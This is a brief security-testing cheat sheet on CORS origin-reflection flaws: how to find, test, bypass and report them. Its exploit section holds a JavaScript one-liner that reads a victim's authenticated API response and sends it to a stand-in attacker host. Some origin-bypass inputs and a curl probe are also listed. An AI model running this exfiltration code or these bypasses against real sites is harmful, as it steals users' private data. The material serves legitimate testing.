# CORS — Origin Reflection

## 📌 What It Is
`Access-Control-Allow-Origin` reflects the request `Origin` header. If `Allow-Credentials: true`, attacker can read authenticated responses cross-origin.

## 🔍 How to Find It
Send `Origin: https://attacker.tld`. If response has `Access-Control-Allow-Origin: https://attacker.tld` AND `Access-Control-Allow-Credentials: true` → vulnerable.

## 🧪 How to Test It
1. Set Origin header to evil domain\n2. Check ACAO and ACAC headers\n3. Try `null` origin (from sandboxed iframe / data: URL)\n4. Try suffix bypass: `attacker.tld.allowed.com`\n5. Try prefix: `allowed.com.attacker.tld`

## 💣 How to Exploit It
On attacker page: `fetch('https://target/api/me', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.tld/?d='+btoa(d)))`

## 🔄 Bypass Techniques
Tricks: Origin from sandboxed iframe = `null`; Origin parser confusion via path/scheme.

## 🛠️ Tools
- CORS Scanner (cors-misconfig)\n- Burp manual\n- nuclei cors templates

## 🎯 Payloads
```\nGET /api/me HTTP/1.1\nOrigin: https://attacker.tld\n```

## 📝 Real-World Examples
James Kettle's CORS research, multiple H1 reports for SaaS providers.

## 🚩 Common Mistakes / Traps
Don't report CORS without ACAC:true unless cross-origin reads sensitive data without creds.

## 📊 Severity & Impact
High (CVSS 7-8) for PII leak.

## 🔗 References
PortSwigger CORS, MDN CORS spec.

## ⚡ One-Liners
```bash\ncurl -sI -H 'Origin: https://evil.tld' https://target/api/me | grep -i 'access-control'\n```
